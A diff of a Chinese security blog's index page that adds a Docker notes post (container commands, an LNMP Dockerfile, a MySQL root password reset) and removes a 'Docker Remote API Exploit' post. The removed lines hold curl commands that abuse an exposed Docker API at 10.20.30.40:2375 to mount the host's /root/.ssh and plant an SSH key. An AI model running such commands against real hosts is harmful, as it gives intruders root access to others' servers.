@@ -117,6 +117,178 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2016/10/08/docker.html" >Docker笔记</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-10-08  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<ul>
+<li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li>
+<li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span>
+
+<span class="token function">docker</span> run -t -i ubuntu /bin/bash
+<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span>
+
+<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span>
+
+<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span>
+<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>
+
+上面两个命令用一个命令代替：
+<span class="token function">docker</span> start -a -i e0521aa52895
+<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>
+
+如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash
+<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash
+
+<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span>
+<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
+<span class="token comment">#删除所有退出状态的容器</span>
+
+<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
+<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p>
+<pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令
+docker exec web ls
+docker start web
+docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p>
+<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
+bzip2 -d -c &lt; img.tar.bz2 |docker load
+
+
+docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
+bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p>
+<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04
+
+ENV ROOT_PATH &#x2F;root
+RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
+WORKDIR $ROOT_PATH
+RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
+WORKDIR &#x2F;root&#x2F;lnmp1.3-full
+RUN echo -e 8e17f72 | bash install.sh
+
+
+EXPOSE 80 3306 9000
+CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
+mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
+mysql -uroot -p
+
+update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
+FLUSH PRIVILEGES;
+quit
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<ul>
+<li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li>
+<li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span>
+
+<span class="token function">docker</span> run -t -i ubuntu /bin/bash
+<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span>
+
+<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span>
+
+<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span>
+<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>
+
+上面两个命令用一个命令代替：
+<span class="token function">docker</span> start -a -i e0521aa52895
+<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>
+
+如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash
+<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash
+
+<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span>
+<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
+<span class="token comment">#删除所有退出状态的容器</span>
+
+<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
+<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p>
+<pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令
+docker exec web ls
+docker start web
+docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p>
+<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
+bzip2 -d -c &lt; img.tar.bz2 |docker load
+
+
+docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
+bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p>
+<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04
+
+ENV ROOT_PATH &#x2F;root
+RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
+WORKDIR $ROOT_PATH
+RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
+WORKDIR &#x2F;root&#x2F;lnmp1.3-full
+RUN echo -e 8e17f72 | bash install.sh
+
+
+EXPOSE 80 3306 9000
+CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
+mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
+mysql -uroot -p
+
+update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
+FLUSH PRIVILEGES;
+quit
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2016/09/25/whitehat-talk-web-security.html" >《白帽子讲Web安全》</a>
 		</h3>
 		</div>
@@ -453,70 +625,6 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/05/18/docker-remote-exploit.html" >Docker Remote API Exploit</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-05-18  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>Source:</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
-<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
-</ul>
-<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
-<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
-<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
-<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
-<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
-<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
-	
-
-	</div>
-  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>Source:</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
-<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
-</ul>
-<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
-<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
-<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
-<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
-<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
-<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
-	
-	</div>
-  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -572,7 +680,7 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>43</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>44</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -593,6 +701,10 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
       </li>
     
@@ -606,10 +718,6 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
     
       <li>
         <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
-      </li>
-    
-      <li>
-        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
       </li>
     
   </ul>
